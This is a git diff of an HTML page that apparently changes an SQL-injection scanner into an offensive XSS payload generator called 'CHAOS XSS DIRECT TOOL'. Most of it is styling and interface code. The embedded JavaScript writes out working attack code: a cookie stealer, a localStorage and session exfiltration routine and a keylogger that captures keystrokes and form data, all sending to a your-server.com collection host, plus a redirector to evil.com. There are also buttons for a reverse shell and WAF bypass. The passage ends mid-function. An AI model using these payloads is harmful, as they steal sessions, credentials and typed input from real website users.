@@ -3,132 +3,1309 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 CHAOS SQL INJECTION WEB v666 🔥</title>
-    <link rel="stylesheet" href="css/style.css">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-tomorrow.min.css" rel="stylesheet" />
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <title>🔥 CHAOS XSS DIRECT TOOL v666.1 🔥</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            overflow-x: hidden;
+            background-image: 
+                repeating-linear-gradient(
+                    0deg,
+                    rgba(0, 255, 0, 0.03) 0px,
+                    transparent 1px,
+                    transparent 2px,
+                    rgba(0, 255, 0, 0.03) 3px
+                );
+        }
+
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(rgba(0,0,0,0.9), rgba(0,0,0,0.9)),
+                repeating-linear-gradient(
+                    0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(0, 255, 0, 0.03) 2px,
+                    rgba(0, 255, 0, 0.03) 4px
+                );
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.5);
+            margin-bottom: 30px;
+            animation: glitch 2s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { text-shadow: 2px 2px #ff0000, -2px -2px #00ffff; }
+            25% { text-shadow: -2px 2px #ff0000, 2px -2px #00ffff; }
+            50% { text-shadow: 2px -2px #ff0000, -2px 2px #00ffff; }
+            75% { text-shadow: -2px -2px #ff0000, 2px 2px #00ffff; }
+        }
+
+        h1 {
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+        }
+
+        .subtitle {
+            color: #ffff00;
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .control-panel {
+            background: rgba(20, 20, 20, 0.9);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+        }
+
+        .payload-workspace {
+            background: rgba(20, 20, 20, 0.9);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ff6600;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            background: #111;
+            border: 2px solid #333;
+            color: #00ff00;
+            padding: 12px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #ff0000;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+
+        textarea {
+            min-height: 120px;
+            resize: vertical;
+        }
+
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            margin: 5px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            color: white;
+        }
+
+        .btn-secondary {
+            background: linear-gradient(45deg, #006400, #00ff00);
+            color: white;
+        }
+
+        .btn-info {
+            background: linear-gradient(45deg, #000080, #4169e1);
+            color: white;
+        }
+
+        .btn-danger {
+            background: linear-gradient(45deg, #8b0000, #dc143c);
+            color: white;
+        }
+
+        .btn-purple {
+            background: linear-gradient(45deg, #800080, #ff00ff);
+            color: white;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 0, 0, 0.6);
+        }
+
+        .method-selector {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .method-card {
+            background: rgba(0, 100, 200, 0.1);
+            border: 2px solid #0080ff;
+            border-radius: 5px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .method-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 128, 255, 0.3);
+        }
+
+        .method-card.active {
+            background: rgba(0, 128, 255, 0.3);
+            border-color: #00ffff;
+        }
+
+        .payload-categories {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+            margin: 20px 0;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .category-card {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            border-radius: 5px;
+            padding: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            font-size: 12px;
+        }
+
+        .category-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
+        }
+
+        .category-card.active {
+            background: rgba(255, 0, 0, 0.3);
+            border-color: #ffff00;
+        }
+
+        .payload-display {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: monospace;
+            font-size: 13px;
+            color: #00ff00;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 0, 0.1);
+            border: 1px solid #ffff00;
+            border-radius: 5px;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 1.5em;
+            color: #00ff00;
+            font-weight: bold;
+        }
+
+        .stat-label {
+            color: #ff6600;
+            font-size: 0.8em;
+            margin-top: 5px;
+        }
+
+        .tabs {
+            display: flex;
+            background: #111;
+            border-bottom: 2px solid #333;
+            margin-bottom: 20px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px;
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 13px;
+        }
+
+        .tab-btn.active {
+            color: #00ff00;
+            background: rgba(0, 255, 0, 0.1);
+            border-bottom: 2px solid #00ff00;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .payload-list {
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid #333;
+            border-radius: 5px;
+            background: #111;
+        }
+
+        .payload-item {
+            padding: 10px;
+            border-bottom: 1px solid #222;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 12px;
+            font-family: monospace;
+            position: relative;
+        }
+
+        .payload-item:hover {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 3px solid #ff0000;
+        }
+
+        .payload-item:last-child {
+            border-bottom: none;
+        }
+
+        .payload-actions {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .payload-item:hover .payload-actions {
+            opacity: 1;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            color: white;
+            border-radius: 5px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .code-block {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            overflow-x: auto;
+            font-size: 13px;
+            font-family: monospace;
+            color: #00ff00;
+            margin: 10px 0;
+        }
+
+        .method-description {
+            background: rgba(0, 100, 200, 0.1);
+            border-left: 4px solid #0080ff;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #ccc;
+        }
+
+        .warning-box {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            color: #ff6666;
+        }
+
+        @media (max-width: 1200px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            
+            .method-selector {
+                grid-template-columns: 1fr 1fr;
+            }
+            
+            .payload-categories {
+                grid-template-columns: 1fr 1fr;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+        }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #111;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #ff0000;
+        }
+    </style>
 </head>
 <body>
     <div class="matrix-bg"></div>
     
     <header class="header">
         <div class="container">
-            <h1><i class="fas fa-skull"></i> CHAOS SQL INJECTION WEB</h1>
-            <p class="subtitle">Web-based SQL injection tool - No server needed!</p>
+            <h1><i class="fas fa-bug"></i> CHAOS XSS DIRECT TOOL v666.1</h1>
+            <p class="subtitle">Direct XSS Payload Generator & Executor - No Scan Needed!</p>
         </div>
     </header>
 
     <main class="container">
-        <div class="control-panel">
-            <div class="input-section">
-                <h3><i class="fas fa-crosshairs"></i> TARGET CONFIGURATION</h3>
+        <div class="main-grid">
+            <!-- Control Panel -->
+            <div class="control-panel">
+                <h3><i class="fas fa-cogs"></i> XSS CONFIGURATION</h3>
+                
                 <div class="form-group">
-                    <label>Target URL:</label>
-                    <input type="text" id="targetUrl" placeholder="http://target.com/page.php?id=1" class="input-field">
+                    <label>XSS Method:</label>
+                    <div class="method-selector">
+                        <div class="method-card active" data-method="basic">
+                            <i class="fas fa-code" style="color: #00ff00;"></i>
+                            <div>Basic XSS</div>
+                        </div>
+                        <div class="method-card" data-method="advanced">
+                            <i class="fas fa-cog" style="color: #ff6600;"></i>
+                            <div>Advanced</div>
+                        </div>
+                        <div class="method-card" data-method="blind">
+                            <i class="fas fa-eye-slash" style="color: #ff0080;"></i>
+                            <div>Blind XSS</div>
+                        </div>
+                        <div class="method-card" data-method="dom">
+                            <i class="fas fa-sitemap" style="color: #0080ff;"></i>
+                            <div>DOM XSS</div>
+                        </div>
+                        <div class="method-card" data-method="custom">
+                            <i class="fas fa-edit" style="color: #ffff00;"></i>
+                            <div>Custom</div>
+                        </div>
+                    </div>
                 </div>
-                <div class="form-row">
+
+                <div class="form-group">
+                    <label>Payload Type:</label>
+                    <div class="payload-categories" id="payloadCategories">
+                        <!-- Categories will be loaded here -->
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Target Parameter Name:</label>
+                    <input type="text" id="paramName" placeholder="q, search, keyword, id" value="q" />
+                </div>
+
+                <div class="form-group">
+                    <label>Custom Payload (Optional):</label>
+                    <textarea id="customPayload" placeholder="<script>alert('XSS')</script>"></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label>Encoding Options:</label>
+                    <select id="encoding">
+                        <option value="none">No Encoding</option>
+                        <option value="url">URL Encoding</option>
+                        <option value="html">HTML Entities</option>
+                        <option value="hex">Hex Encoding</option>
+                        <option value="unicode">Unicode</option>
+                        <option value="base64">Base64</option>
+                    </select>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-number" id="payloadCount">0</div>
+                        <div class="stat-label">Payloads</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number" id="methodCount">0</div>
+                        <div class="stat-label">Methods</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number" id="categoryCount">0</div>
+                        <div class="stat-label">Categories</div>
+                    </div>
+                </div>
+
+                <div class="action-buttons">
+                    <button class="btn btn-primary" onclick="generatePayload()">
+                        <i class="fas fa-magic"></i> GENERATE PAYLOAD
+                    </button>
+                    <button class="btn btn-secondary" onclick="copyPayload()">
+                        <i class="fas fa-copy"></i> COPY PAYLOAD
+                    </button>
+                    <button class="btn btn-info" onclick="testPayload()">
+                        <i class="fas fa-play"></i> TEST PAYLOAD
+                    </button>
+                    <button class="btn btn-purple" onclick="generateExploit()">
+                        <i class="fas fa-rocket"></i> CREATE EXPLOIT
+                    </button>
+                </div>
+            </div>
+
+            <!-- Payload Workspace -->
+            <div class="payload-workspace">
+                <div class="tabs">
+                    <button class="tab-btn active" data-tab="payloads">
+                        <i class="fas fa-code"></i> PAYLOADS
+                    </button>
+                    <button class="tab-btn" data-tab="exploits">
+                        <i class="fas fa-bomb"></i> EXPLOITS
+                    </button>
+                    <button class="tab-btn" data-tab="tools">
+                        <i class="fas fa-tools"></i> TOOLS
+                    </button>
+                    <button class="tab-btn" data-tab="encode">
+                        <i class="fas fa-shield-alt"></i> ENCODER
+                    </button>
+                </div>
+
+                <div id="payloads" class="tab-content active">
+                    <h3><i class="fas fa-code"></i> XSS PAYLOAD LIBRARY</h3>
+                    <div class="method-description" id="methodDescription">
+                        Select a method and category to view available payloads
+                    </div>
+                    <div class="payload-list" id="payloadList">
+                        <!-- Payloads will be loaded here -->
+                    </div>
+                </div>
+
+                <div id="exploits" class="tab-content">
+                    <h3><i class="fas fa-bomb"></i> ADVANCED EXPLOITS</h3>
+                    <div class="action-buttons">
+                        <button class="btn btn-danger" onclick="generateCookieStealer()">
+                            <i class="fas fa-cookie"></i> Cookie Stealer
+                        </button>
+                        <button class="btn btn-danger" onclick="generateKeylogger()">
+                            <i class="fas fa-keyboard"></i> Keylogger
+                        </button>
+                        <button class="btn btn-danger" onclick="generateRedirector()">
+                            <i class="fas fa-external-link-alt"></i> Redirector
+                        </button>
+                        <button class="btn btn-danger" onclick="generateDataThief()">
+                            <i class="fas fa-database"></i> Data Thief
+                        </button>
+                        <button class="btn btn-danger" onclick="generateShell()">
+                            <i class="fas fa-terminal"></i> Reverse Shell
+                        </button>
+                    </div>
+                    <div id="exploitResult" class="payload-display"></div>
+                </div>
+
+                <div id="tools" class="tab-content">
+                    <h3><i class="fas fa-tools"></i> XSS UTILITIES</h3>
+                    <div class="action-buttons">
+                        <button class="btn btn-info" onclick="generateBlindPayload()">
+                            <i class="fas fa-eye-slash"></i> Blind XSS
+                        </button>
+                        <button class="btn btn-info" onclick="generatePolyglot()">
+                            <i class="fas fa-language"></i> Polyglot
+                        </button>
+                        <button class="btn btn-info" onclick="generateWAFBypass()">
+                            <i class="fas fa-shield-alt"></i> WAF Bypass
+                        </button>
+                        <button class="btn btn-info" onclick="generateFilterBypass()">
+                            <i class="fas fa-filter"></i> Filter Bypass
+                        </button>
+                    </div>
+                    <div id="toolResult" class="payload-display"></div>
+                </div>
+
+                <div id="encode" class="tab-content">
+                    <h3><i class="fas fa-shield-alt"></i> PAYLOAD ENCODER</h3>
                     <div class="form-group">
-                        <label>Method:</label>
-                        <select id="httpMethod" class="select-field">
-                            <option value="GET">GET</option>
-                            <option value="POST">POST</option>
-                        </select>
+                        <label>Input Payload:</label>
+                        <textarea id="encodeInput" placeholder="Enter payload to encode..."></textarea>
+                    </div>
+                    <div class="action-buttons">
+                        <button class="btn btn-secondary" onclick="encodePayload('url')">
+                            <i class="fas fa-link"></i> URL Encode
+                        </button>
+                        <button class="btn btn-secondary" onclick="encodePayload('html')">
+                            <i class="fas fa-code"></i> HTML Encode
+                        </button>
+                        <button class="btn btn-secondary" onclick="encodePayload('hex')">
+                            <i class="fas fa-hashtag"></i> Hex Encode
+                        </button>
+                        <button class="btn btn-secondary" onclick="encodePayload('unicode')">
+                            <i class="fas fa-font"></i> Unicode
+                        </button>
+                        <button class="btn btn-secondary" onclick="encodePayload('base64')">
+                            <i class="fas fa-baseball-ball"></i> Base64
+                        </button>
                     </div>
                     <div class="form-group">
-                        <label>Threads:</label>
-                        <input type="number" id="threadCount" value="10" min="1" max="50" class="input-field">
+                        <label>Encoded Result:</label>
+                        <div id="encodeOutput" class="payload-display"></div>
                     </div>
                 </div>
-                <div class="form-group">
-                    <label>Custom Headers (JSON format):</label>
-                    <textarea id="customHeaders" placeholder='{"User-Agent": "Mozilla/5.0"}' class="textarea-field"></textarea>
+
+                <div class="warning-box">
+                    <strong>⚠️ WARNING:</strong> This tool is for educational purposes only. Misuse may violate laws. Always get permission before testing!
                 </div>
             </div>
-
-            <div class="payload-section">
-                <h3><i class="fas fa-bomb"></i> PAYLOAD CONFIGURATION</h3>
-                <div class="payload-types">
-                    <label><input type="checkbox" id="unionPayload" checked> UNION Based</label>
-                    <label><input type="checkbox" id="errorPayload" checked> Error Based</label>
-                    <label><input type="checkbox" id="blindPayload" checked> Blind Based</label>
-                    <label><input type="checkbox" id="timePayload" checked> Time Based</label>
-                    <label><input type="checkbox" id="customPayload"> Custom Payloads</label>
-                </div>
-                <div class="form-group">
-                    <label>Custom Payloads (one per line):</label>
-                    <textarea id="customPayloadText" placeholder="' OR 1=1--" class="textarea-field"></textarea>
-                </div>
-            </div>
-
-            <div class="action-section">
-                <button id="startScan" class="btn btn-primary">
-                    <i class="fas fa-play"></i> START SCAN
-                </button>
-                <button id="stopScan" class="btn btn-danger">
-                    <i class="fas fa-stop"></i> STOP SCAN
-                </button>
-                <button id="exportResults" class="btn btn-success">
-                    <i class="fas fa-download"></i> EXPORT RESULTS
-                </button>
-            </div>
-        </div>
-
-        <div class="progress-section">
-            <div class="progress-bar">
-                <div id="progressFill" class="progress-fill"></div>
-            </div>
-            <div class="progress-stats">
-                <span>Progress: <span id="progressText">0%</span></span>
-                <span>Vulnerabilities: <span id="vulnCount">0</span></span>
-                <span>Requests: <span id="requestCount">0</span></span>
-            </div>
-        </div>
-
-        <div class="results-section">
-            <div class="tabs">
-                <button class="tab-btn active" data-tab="vulnerabilities">
-                    <i class="fas fa-bug"></i> Vulnerabilities
-                </button>
-                <button class="tab-btn" data-tab="raw-response">
-                    <i class="fas fa-code"></i> Raw Response
-                </button>
-                <button class="tab-btn" data-tab="exploitation">
-                    <i class="fas fa-hammer"></i> Exploitation
-                </button>
-            </div>
-
-            <div id="vulnerabilities" class="tab-content active">
-                <div id="vulnResults" class="results-container"></div>
-            </div>
-
-            <div id="raw-response" class="tab-content">
-                <pre id="rawResponse" class="code-block"><code class="language-http"></code></pre>
-            </div>
-
-            <div id="exploitation" class="tab-content">
-                <div class="exploit-tools">
-                    <h4>Database Extraction</h4>
-                    <button id="extractDB" class="btn btn-info">Extract Database Info</button>
-                    <button id="dumpTables" class="btn btn-info">Dump All Tables</button>
-                    <button id="getShell" class="btn btn-warning">Try Upload Shell</button>
-                </div>
-                <div id="exploitResults" class="exploit-output"></div>
-            </div>
-        </div>
-
-        <div class="logs-section">
-            <h3><i class="fas fa-terminal"></i> SCAN LOGS</h3>
-            <div id="scanLogs" class="logs-container"></div>
         </div>
     </main>
 
-    <footer class="footer">
-        <p>🔥 CHAOS SQL INJECTION WEB v666 - For Educational Purposes Only 🔥</p>
-    </footer>
+    <script src="xss-payloads.js"></script>
+    <script src="xss-methods.js"></script>
+    <script src="xss-exploits.js"></script>
+    <script>
+        // CHAOS XSS DIRECT TOOL v666.1 - MAIN ENGINE
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
-    <script src="js/payloads.js"></script>
-    <script src="js/engine.js"></script>
-    <script src="js/interface.js"></script>
+        let currentMethod = 'basic';
+        let currentCategory = 'script';
+        let currentPayloads = [];
+        let selectedPayload = '';
+
+        // Initialize method selector
+        document.querySelectorAll('.method-card').forEach(card => {
+            card.addEventListener('click', () => {
+                document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
+                card.classList.add('active');
+                currentMethod = card.getAttribute('data-method');
+                loadCategories();
+                updateMethodDescription();
+            });
+        });
+
+        function loadCategories() {
+            const categories = XSS_METHODS[currentMethod]?.categories || [];
+            const container = document.getElementById('payloadCategories');
+            
+            container.innerHTML = '';
+            categories.forEach((category, index) => {
+                const card = document.createElement('div');
+                card.className = 'category-card' + (index === 0 ? ' active' : '');
+                card.innerHTML = `
+                    <i class="fas fa-${category.icon}" style="color: ${category.color};"></i>
+                    <div>${category.name}</div>
+                    <small>${category.count} payloads</small>
+                `;
+                card.addEventListener('click', () => {
+                    document.querySelectorAll('.category-card').forEach(c => c.classList.remove('active'));
+                    card.classList.add('active');
+                    currentCategory = category.id;
+                    loadPayloads();
+                });
+                container.appendChild(card);
+            });
+            
+            // Auto select first category
+            if (categories.length > 0) {
+                currentCategory = categories[0].id;
+                loadPayloads();
+            }
+            
+            updateStats();
+        }
+
+        function loadPayloads() {
+            const payloads = XSS_METHODS[currentMethod]?.payloads[currentCategory] || [];
+            currentPayloads = payloads;
+            
+            const container = document.getElementById('payloadList');
+            container.innerHTML = '';
+            
+            if (payloads.length === 0) {
+                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">No payloads available for this category</div>';
+                return;
+            }
+            
+            payloads.forEach((payload, index) => {
+                const item = document.createElement('div');
+                item.className = 'payload-item';
+                item.innerHTML = `
+                    <div style="font-size: 11px; color: #666; margin-bottom: 5px;">#${index + 1}</div>
+                    <div style="word-break: break-all; margin-right: 80px;">${escapeHtml(payload.length > 100 ? payload.substring(0, 100) + '...' : payload)}</div>
+                    <div class="payload-actions">
+                        <button class="btn btn-info" style="padding: 2px 6px; font-size: 10px;" onclick="selectPayload(${index})">
+                            <i class="fas fa-check"></i>
+                        </button>
+                        <button class="btn btn-secondary" style="padding: 2px 6px; font-size: 10px;" onclick="copyPayloadIndex(${index})">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                `;
+                container.appendChild(item);
+            });
+            
+            updateStats();
+        }
+
+        function selectPayload(index) {
+            selectedPayload = currentPayloads[index];
+            document.getElementById('customPayload').value = selectedPayload;
+            showNotification('Payload selected!', 'success');
+        }
+
+        function copyPayloadIndex(index) {
+            const payload = currentPayloads[index];
+            navigator.clipboard.writeText(payload).then(() => {
+                showNotification('Payload copied!', 'success');
+            });
+        }
+
+        function copyPayload() {
+            const payload = document.getElementById('customPayload').value || selectedPayload;
+            if (payload) {
+                navigator.clipboard.writeText(payload).then(() => {
+                    showNotification('Payload copied to clipboard!', 'success');
+                });
+            } else {
+                showNotification('No payload to copy!', 'error');
+            }
+        }
+
+        function generatePayload() {
+            const paramName = document.getElementById('paramName').value || 'q';
+            const customPayload = document.getElementById('customPayload').value;
+            const encoding = document.getElementById('encoding').value;
+            
+            let payload = customPayload || selectedPayload;
+            if (!payload) {
+                // Generate random payload from current category
+                const payloads = XSS_METHODS[currentMethod]?.payloads[currentCategory] || [];
+                if (payloads.length > 0) {
+                    payload = payloads[Math.floor(Math.random() * payloads.length)];
+                } else {
+                    payload = '<script>alert("XSS")</script>';
+                }
+            }
+            
+            // Apply encoding
+            if (encoding !== 'none') {
+                payload = encodePayload(payload, encoding);
+            }
+            
+            // Generate final payload with parameter
+            const finalPayload = `${paramName}=${payload}`;
+            
+            document.getElementById('customPayload').value = finalPayload;
+            showNotification('Payload generated with encoding!', 'success');
+        }
+
+        function testPayload() {
+            const payload = document.getElementById('customPayload').value;
+            if (!payload) {
+                showNotification('No payload to test!', 'error');
+                return;
+            }
+            
+            // Create test HTML
+            const testHtml = `
+                <!DOCTYPE html>
+                <html>
+                <head><title>XSS Test</title></head>
+                <body>
+                    <h1>XSS Payload Test</h1>
+                    <p>Parameter: ${payload}</p>
+                    <div id="result">Testing payload...</div>
+                    <script>
+                        try {
+                            const urlParams = new URLSearchParams(window.location.search);
+                            const payload = urlParams.get('test') || '${payload.replace(/'/g, "\\'")}';
+                            
+                            // Try to execute the payload
+                            eval(payload);
+                            document.getElementById('result').innerHTML = '<span style="color: red;">PAYLOAD EXECUTED! XSS VULNERABLE!</span>';
+                        } catch (e) {
+                            document.getElementById('result').innerHTML = '<span style="color: green;">Payload failed: ' + e.message + '</span>';
+                        }
+                    </script>
+                </body>
+                </html>
+            `;
+            
+            const blob = new Blob([testHtml], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            window.open(url + '?test=' + encodeURIComponent(payload), '_blank', 'width=800,height=600');
+            showNotification('Payload test opened in new window!', 'success');
+        }
+
+        function generateExploit() {
+            const payload = document.getElementById('customPayload').value || selectedPayload;
+            if (!payload) {
+                showNotification('No payload selected!', 'error');
+                return;
+            }
+            
+            const exploit = generateExploitCode(payload);
+            document.getElementById('exploitResult').innerHTML = `
+                <h4>Generated Exploit:</h4>
+                <div class="payload-display">${escapeHtml(exploit)}</div>
+                <div style="margin-top: 10px;">
+                    <button class="btn btn-secondary" onclick="copyExploit()">
+                        <i class="fas fa-copy"></i> Copy Exploit
+                    </button>
+                </div>
+            `;
+            showNotification('Exploit generated!', 'success');
+        }
+
+        function generateExploitCode(payload) {
+            return `<script>
+// XSS Exploit Generated by CHAOS XSS Tool v666.1
+// Payload: ${payload}
+
+// Cookie Stealer
+fetch('http://your-server.com/steal.php?cookies=' + encodeURIComponent(document.cookie));
+
+// Data Exfiltration
+var data = {
+    cookies: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    html: document.body.innerHTML.substring(0, 5000),
+    url: window.location.href,
+    referrer: document.referrer,
+    userAgent: navigator.userAgent
+};
+
+fetch('http://your-server.com/exfil.php', {
+    method: 'POST',
+    body: JSON.stringify(data),
+    headers: {'Content-Type': 'application/json'}
+});
+
+// Execute original payload
+try {
+    ${payload.replace(/^[^=]*=/, '')} // Remove parameter part
+} catch(e) {
+    console.log('Payload execution error:', e);
+}
+
+alert('XSS EXPLOIT EXECUTED!');
+</script>`;
+        }
+
+        function copyExploit() {
+            const exploitText = document.getElementById('exploitResult').textContent;
+            navigator.clipboard.writeText(exploitText).then(() => {
+                showNotification('Exploit copied!', 'success');
+            });
+        }
+
+        // Exploit generators
+        function generateCookieStealer() {
+            const code = `<script>
+// Cookie Stealer by CHAOS XSS Tool
+fetch('http://your-server.com/steal.php?cookies=' + encodeURIComponent(document.cookie) + 
+      '&url=' + encodeURIComponent(window.location.href) + 
+      '&domain=' + encodeURIComponent(window.location.hostname));
+alert('Cookies stolen!');
+</script>`;
+            
+            document.getElementById('exploitResult').innerHTML = `
+                <h4>Cookie Stealer Exploit:</h4>
+                <div class="payload-display">${escapeHtml(code)}</div>
+                <p style="color: #ff6600; margin-top: 10px;">Replace 'your-server.com' with your server URL</p>
+            `;
+            showNotification('Cookie stealer generated!', 'success');
+        }
+
+        function generateKeylogger() {
+            const code = `<script>
+// Keylogger by CHAOS XSS Tool
+document.addEventListener('keydown', function(e) {
+    fetch('http://your-server.com/log.php', {
+        method: 'POST',
+        body: JSON.stringify({
+            key: e.key,
+            code: e.code,
+            target: e.target.tagName,
+            value: e.target.value || '',
+            timestamp: Date.now(),
+            url: window.location.href
+        }),
+        headers: {'Content-Type': 'application/json'}
+    });
+});
+
+// Also log form submissions
+document.addEventListener('submit', function(e) {
+    var formData = new FormData(e.target);
+    var data = {};
+    for (var [key, value] of formData.entries()) {
+        data[key] = value;
+    }
+    
+    fetch('http://your-server.com/form.php', {
+        method: 'POST',
+        body: JSON.stringify({formData: data, url: window.location.href}),
+        headers: {'Content-Type': 'application/json'}
+    });
+});
+</script>`;
+            
+            document.getElementById('exploitResult').innerHTML = `
+                <h4>Keylogger Exploit:</h4>
+                <div class="payload-display">${escapeHtml(code)}</div>
+                <p style="color: #ff6600; margin-top: 10px;">Replace 'your-server.com' with your server URL</p>
+            `;
+            showNotification('Keylogger generated!', 'success');
+        }
+
+        function generateRedirector() {
+            const redirectUrl = prompt('Enter redirect URL:', 'http://evil.com');
+            if (redirectUrl) {
+                const code = `<script>
+// Redirector by CHAOS XSS Tool
+setTimeout(function() {
+    window.location.href = '${redirectUrl}';
+}, 3000); // Redirect after 3 seconds
+
+// Or redirect immediately
+// window.location.href = '${redirectUrl}';
+
+// Or open in new window
+// window.open('${redirectUrl}', '_blank');
+</script>`;
+                
+                document.getElementById('exploitResult').innerHTML = `
+                    <h4>Redirector Exploit:</h4>
+                    <div class="payload-display">${escapeHtml(code)}</div>
+                    <p style="color: #00ff00; margin-top: 10px;">Will redirect to: ${redirectUrl}</p>
+                `;
+                showNotification('Redirector generated!', 'success');
+            }
+        }
+
+        function generateDataThief() {
+            const code = `<script>
+// Data Thief by CHAOS XSS Tool
+function stealData() {
+    var data = {
+        // Cookies
+        cookies: document.cookie,
+        
